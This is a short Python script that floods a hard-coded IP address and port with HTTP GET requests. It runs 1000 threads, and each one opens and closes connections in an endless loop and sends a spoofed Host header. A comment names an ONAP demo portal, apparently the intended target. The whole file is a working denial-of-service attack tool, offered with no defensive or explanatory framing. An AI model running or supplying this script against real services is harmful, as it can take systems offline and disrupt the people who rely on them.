import socket
import threading


#http://portal.api.simpledemo.onap.org:31095/
target = '10.254.184.164'
fake_ip = '182.21.20.30'
port = 31785

charge_num = 0
 
def charge(i):
    while True:
        #print(i)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        global charge_num
        charge_num += 1
        print(charge_num, end='\r')
        s.close()


for i in range(1000):
    thread = threading.Thread(target=charge, args=(i,))
    thread.start()



